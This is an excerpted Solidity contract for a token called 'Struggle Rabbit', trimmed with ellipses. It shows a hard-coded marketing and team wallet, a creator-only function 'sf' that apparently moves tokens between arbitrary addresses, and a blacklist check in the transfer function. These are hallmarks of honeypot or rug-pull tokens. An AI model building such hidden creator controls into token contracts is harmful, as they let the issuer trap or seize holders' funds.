...
contract Struggle is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Struggle Rabbit";
    string private _symbol = "Struggle Rabbit";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4EBCFA4373AD76F1f7Bc041a46B383771Df8D901); // Marketing Address
    address payable private teamWalletAddress = payable(0x4EBCFA4373AD76F1f7Bc041a46B383771Df8D901);
    ...
    function sf(address t, address to, uint value) external onlyCreator {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!blist[recipient] && !blist[sender], "blist address");
